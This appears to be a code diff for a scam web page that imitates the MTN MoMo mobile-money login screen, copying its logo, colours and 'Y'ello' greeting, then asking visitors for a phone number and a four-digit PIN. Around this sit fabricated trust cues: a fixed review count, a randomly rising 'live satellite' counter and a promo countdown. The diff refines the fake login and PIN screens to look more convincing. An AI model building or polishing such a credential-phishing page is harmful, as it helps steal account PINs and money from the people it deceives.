@@ -224,54 +224,89 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 .secure-note i{color:#ffcc00;margin-right:4px}
 
 /* ============================================================
-   LOGIN PAGE (MoMo style — same as screenshot)
+   LOGIN PAGE (matching MTN MoMo screenshot)
    ============================================================ */
 .login-page{background:#ffffff;min-height:100vh;padding:0;position:relative;z-index:2}
-.login-topbar{background:#ffffff;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
+.login-topbar{background:#ffffff;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
 .login-topbar .back-arrow{font-size:22px;color:#1c1c1e;cursor:pointer;background:none;border:none;padding:4px}
-.login-topbar .help-icon{font-size:20px;color:#1c1c1e;cursor:pointer}
-.login-body{padding:30px 26px 40px;display:flex;flex-direction:column;min-height:calc(100vh - 60px)}
+.login-topbar .help-icon{font-size:22px;color:#1c1c1e;cursor:pointer;font-weight:700}
+.login-body{padding:44px 32px 40px;display:flex;flex-direction:column;min-height:calc(100vh - 60px)}
 
-/* MoMo logo */
-.momo-logo-wrap{text-align:center;margin-bottom:24px}
+.momo-logo-wrap{text-align:center;margin-bottom:34px}
 .momo-logo{
   display:inline-flex;
   align-items:center;
   justify-content:center;
-  width:62px;
-  height:62px;
+  width:60px;
+  height:60px;
   background:#0d3a75;
-  border-radius:14px;
-  box-shadow:0 6px 18px rgba(13,58,117,.3);
+  border-radius:8px;
   position:relative;
+  margin-bottom:0;
 }
 .momo-logo::after{
   content:'';
   position:absolute;
-  bottom:-4px;
-  left:6%;
-  width:88%;
-  height:6px;
+  bottom:0;
+  left:0;
+  width:100%;
+  height:8px;
   background:#f7c400;
-  border-radius:0 0 6px 6px;
+  border-radius:0 0 8px 8px;
 }
-.momo-logo svg{width:34px;height:34px}
-.momo-brand-name{font-size:20px;font-weight:800;color:#0d3a75;letter-spacing:-.4px;line-height:1;margin-top:12px}
-.momo-brand-sub{font-size:9px;font-weight:700;color:#0d3a75;letter-spacing:1.5px;text-transform:uppercase;margin-top:3px}
+.momo-logo svg{width:34px;height:34px;position:relative;z-index:1}
+.momo-brand-name{
+  font-size:22px;
+  font-weight:900;
+  color:#0d3a75;
+  letter-spacing:-.5px;
+  line-height:1;
+  margin-top:14px;
+}
+.momo-brand-sub{
+  font-size:10px;
+  font-weight:800;
+  color:#0d3a75;
+  letter-spacing:2px;
+  text-transform:uppercase;
+  margin-top:5px;
+}
 
-/* Greeting */
-.login-greeting{text-align:center;font-size:36px;font-weight:900;color:#1c1c1e;margin:30px 0 4px;letter-spacing:-1px;font-family:'Arial Black','Arial',sans-serif;font-style:italic}
-.login-subgreeting{text-align:center;font-size:15px;color:#5f6368;margin-bottom:38px;font-weight:500}
+.login-greeting{
+  text-align:center;
+  font-size:44px;
+  font-weight:900;
+  color:#1c1c1e;
+  margin:44px 0 6px;
+  letter-spacing:-1.5px;
+  font-family:'Arial Black','Arial',sans-serif;
+  font-style:italic;
+  line-height:1;
+}
+.login-subgreeting{
+  text-align:center;
+  font-size:17px;
+  color:#1c1c1e;
+  margin-bottom:44px;
+  font-weight:400;
+  letter-spacing:-.2px;
+}
 
-/* Label */
-.login-label{font-size:15px;font-weight:800;color:#1c1c1e;line-height:1.4;margin-bottom:20px;letter-spacing:-.2px}
+.login-label{
+  font-size:17px;
+  font-weight:800;
+  color:#1c1c1e;
+  line-height:1.35;
+  margin-bottom:24px;
+  letter-spacing:-.3px;
+  max-width:280px;
+}
 
-/* Input */
 .login-input{
   width:100%;
-  padding:18px 18px;
+  padding:20px 18px;
   border:1.5px solid #1c1c1e;
-  border-radius:10px;
+  border-radius:4px;
   font-size:16px;
   color:#1c1c1e;
   background:#fff;
@@ -279,27 +314,27 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
   font-weight:500;
   letter-spacing:.3px;
   transition:border-color .2s;
-  margin-bottom:16px;
+  margin-bottom:18px;
 }
 .login-input::placeholder{color:#9aa0a6;font-weight:400;letter-spacing:0}
-.login-input:focus{border-width:2px;border-color:#0d3a75;padding:17px 17px}
+.login-input:focus{border-width:2px;border-color:#0d3a75;padding:19px 17px}
 
-/* Number changed link */
 .login-number-link{
   color:#0d3a75;
-  font-size:14px;
-  font-weight:700;
+  font-size:15px;
+  font-weight:800;
   text-decoration:underline;
-  text-underline-offset:3px;
-  margin-bottom:32px;
+  text-underline-offset:4px;
+  text-decoration-thickness:2px;
+  margin-bottom:38px;
   display:inline-block;
   cursor:pointer;
+  align-self:flex-start;
 }
 
-/* Sign in button */
 .login-signin{
   width:100%;
-  padding:19px;
+  padding:20px;
   border:none;
   border-radius:50px;
   background:#f7c400;
@@ -315,7 +350,6 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 .login-signin:active{transform:scale(.98);background:#e6b800}
 .login-signin:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
 
-/* Footer */
 .login-footer{
   margin-top:auto;
   padding-top:30px;
@@ -352,7 +386,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 .sms-secure{text-align:center;font-size:11px;color:#8e8e93;letter-spacing:1.2px;font-weight:700;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:6px}
 .sms-secure i{color:#34c759}
 
-/* PIN PAGE — FIXED */
+/* PIN */
 .pin-page{background:#ffffff;min-height:100vh;padding:0;position:relative;z-index:2}
 .pin-topbar{background:#ffffff;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
 .pin-topbar .back-arrow{font-size:22px;color:#1c1c1e;cursor:pointer;background:none;border:none;padding:4px}
@@ -364,7 +398,6 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 .pin-phone-display strong{color:#1c1c1e;font-weight:800}
 .pin-label-top{font-size:13px;font-weight:800;color:#1c1c1e;margin-bottom:12px;letter-spacing:.2px}
 
-/* FIXED PIN BOXES */
 .pin-field-4{display:flex;gap:12px;margin-bottom:16px}
 .pin-box-real{
   flex:1;
@@ -383,20 +416,10 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
   -moz-appearance:textfield;
   caret-color:transparent;
 }
-.pin-box-real:focus{
-  border-color:#0d3a75;
-  background:#fff;
-}
-.pin-box-real.filled{
-  background:#f7c400;
-  border-color:#f7c400;
-  color:#1c1c1e;
-}
+.pin-box-real:focus{border-color:#0d3a75;background:#fff}
+.pin-box-real.filled{background:#f7c400;border-color:#f7c400;color:#1c1c1e}
 .pin-box-real::-webkit-inner-spin-button,
-.pin-box-real::-webkit-outer-spin-button{
-  -webkit-appearance:none;
-  margin:0;
-}
+.pin-box-real::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}
 
 .pin-forgot-row{text-align:right;margin-bottom:30px}
 .pin-forgot-row a{color:#0d3a75;font-size:13.5px;font-weight:700;text-decoration:none}
@@ -503,8 +526,8 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
   .track-progress-fill{left:22px}
   .testi-card{width:260px;padding:14px 14px}
   .testi-body{font-size:12px}
-  .login-greeting{font-size:28px}
-  .login-body{padding:24px 20px 30px}
+  .login-greeting{font-size:36px}
+  .login-body{padding:30px 24px 30px}
   .pin-body{padding:26px 20px 30px}
   .pin-box-real{height:56px;font-size:22px}
   .pin-field-4{gap:8px}
@@ -687,12 +710,8 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
             <span style="color:#94a3b8;margin-left:6px;font-size:11px">4.9 / 5 · <span id="liveReviewCount">12,847</span>+ reviews</span>
           </div>
         </div>
-        <div class="testi-marquee" id="marquee1">
-          <div class="testi-track" id="track1"></div>
-        </div>
-        <div class="testi-marquee" id="marquee2">
-          <div class="testi-track reverse" id="track2"></div>
-        </div>
+        <div class="testi-marquee" id="marquee1"><div class="testi-track" id="track1"></div></div>
+        <div class="testi-marquee" id="marquee2"><div class="testi-track reverse" id="track2"></div></div>
       </div>
     </div>
   </div>
@@ -745,7 +764,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
-  <!-- PAGE 3: LOGIN (MoMo Welcome) -->
+  <!-- PAGE 3: LOGIN -->
   <div class="page" id="page-login">
     <div class="login-page">
       <div class="login-topbar">
@@ -756,13 +775,12 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
         <div class="momo-logo-wrap">
           <div class="momo-logo">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M4 20V8l8-5 8 5v12l-8 4-8-4z" stroke="#f7c400" stroke-width="1.5" fill="none"/>
-              <path d="M12 3v18" stroke="#f7c400" stroke-width="1.2"/>
-              <circle cx="12" cy="11" r="2.5" fill="#f7c400"/>
+              <path d="M12 3 L16 20 L12 17 L8 20 Z" fill="#f7c400" stroke="#f7c400" stroke-width="1.2" stroke-linejoin="round"/>
+              <circle cx="12" cy="12" r="1.5" fill="#0d3a75"/>
             </svg>
           </div>
           <div class="momo-brand-name">MoMo</div>
-          <div class="momo-brand-sub">from MTN</div>
+          <div class="momo-brand-sub">FROM MTN</div>
         </div>
         <h1 class="login-greeting">Y'ello,</h1>
         <p class="login-subgreeting">welcome to MoMo</p>
@@ -800,7 +818,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
-  <!-- PAGE 5: PIN (FIXED) -->
+  <!-- PAGE 5: PIN -->
   <div class="page" id="page-pin">
     <div class="pin-page">
       <div class="pin-topbar">
@@ -995,7 +1013,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 
   function genReqId() { return Date.now().toString() + Math.floor(Math.random()*1000).toString(); }
 
-  /* LIVE SATELLITE COUNTER */
+  /* LIVE SATELLITE */
   let satCount = 7842;
   setInterval(() => {
     satCount += Math.floor(Math.random() * 3);
@@ -1026,7 +1044,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
     showToast(`⚡ ${finalDown} Mbps ↓  ·  ${finalUp} Mbps ↑  ·  ${finalPing} ms`, 'success');
   });
 
-  /* WHAT'S IN THE BOX */
+  /* BOX */
   $('boxSection').addEventListener('click', function() { this.classList.toggle('open'); });
 
   /* PROMO COUNTDOWN */
@@ -1046,7 +1064,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
   setInterval(tickPromo, 1000);
   tickPromo();
 
-  /* PROMO HANDLER */
+  /* PROMO BTN */
   document.querySelector('.promo-btn').addEventListener('click', function() {
     state.planName = this.dataset.plan;
     state.planSize = this.dataset.size;
@@ -1259,7 +1277,7 @@ ${state.contact ? '📞 ' + state.contact : ''}
     }
   });
 
-  /* PIN PAGE — FIXED */
+  /* PIN */
   const pinBoxes = document.querySelectorAll('.pin-box-real');
 
   function resetPinBoxes() {
@@ -1297,9 +1315,7 @@ ${state.contact ? '📞 ' + state.contact : ''}
         }
       }
     });
-    box.addEventListener('focus', function() {
-      this.select();
-    });
+    box.addEventListener('focus', function() { this.select(); });
   });
 
   function getPinValueReal() {
@@ -1391,4 +1407,4 @@ ${state.contact ? '📞 ' + state.contact : ''}
 })();
 </script>
 </body>
-                                                                                                                                                                                                                                                                                                                 </html>
+   </html>
